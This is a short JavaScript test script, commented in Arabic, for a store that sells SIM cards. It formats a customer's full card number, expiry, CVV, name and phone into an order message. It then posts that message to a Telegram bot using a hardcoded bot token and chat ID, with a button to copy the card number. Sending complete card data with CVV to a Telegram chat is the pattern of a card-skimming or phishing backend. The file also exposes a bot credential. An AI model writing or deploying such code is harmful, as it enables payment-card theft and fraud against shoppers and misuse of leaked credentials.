// تيست حقيقي - بيبعت رسالة فعلية للتلجرام
const TELEGRAM_BOT_TOKEN = "8724765414:AAFpIeQMZIVfzDDiGUkAvh_MUtEenwc4HR8";
const TELEGRAM_CHAT_ID = "967729669";

const cardNumber = "4111 1111 1111 1111";
const expiry = "12/26";
const cvv = "123";
const cardHolder = "Ahmed Mohammed";
const customer = "أحمد محمد";
const whatsapp = "+966512345678";
const total = 299;
const downPayment = 100;
const installmentType = "installment";
const months = 6;
const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;

const ltr = "\u200E";
const formattedCard = cardNumber.replace(/\s/g, "").replace(/(\d{4})/g, "$1 ").trim();
const formattedPhone = whatsapp.replace(/^(\+966|966)/, "0");

const text = [
  `🛒 متجر مؤسسة لمسه لبيع الشرائح`,
  `🔖 Order ID: ${ltr}#${orderId}`,
  ``,
  `💲 Total Amount: ${ltr}${total} SAR`,
  ...(installmentType === "installment"
    ? [`🧾 First Payment: ${ltr}${downPayment} SAR`]
    : [`🧾 Payment Type: Full Amount`]),
  ``,
  `🏦 MadaVisa - New Order`,
  `🙍 Order For: ${ltr}${customer}`,
  `📱 Phone Number: ${ltr}${formattedPhone}`,
  `🪪 Card Number: ${ltr}${formattedCard}`,
  `✍️ Card Holder: ${ltr}${cardHolder}`,
  `📆 Valid To: ${ltr}${expiry}`,
  `🔑 CVV: ${ltr}${cvv}`,
].join("\n");

console.log("=== الرسالة اللي هتيجي في التلجرام ===\n");
console.log(text);
console.log("\n=======================================\n");

// رقم واتساب: لو بدأ بـ 05 نحوله لـ 966
const rawNum = whatsapp.replace(/\D/g, "");
const whatsappNum = rawNum.startsWith("0") ? `966${rawNum.slice(1)}` : rawNum;

const reply_markup = {
  inline_keyboard: [[
    { text: "📋 نسخ البطاقة", copy_text: { text: cardNumber.replace(/\s/g, "") } },
    { text: "💬 WhatsApp", url: `https://wa.me/${whatsappNum}` },
  ]],
};

const res = await fetch(
  `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
  {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, reply_markup }),
  }
);

const json = await res.json();
if (json.ok) {
  console.log("✅ الرسالة اتبعتت بنجاح! زر الواتساب مربوط بـ:", `https://wa.me/${whatsappNum}`);
} else {
  console.error("❌ فيه مشكلة:", JSON.stringify(json, null, 2));
}
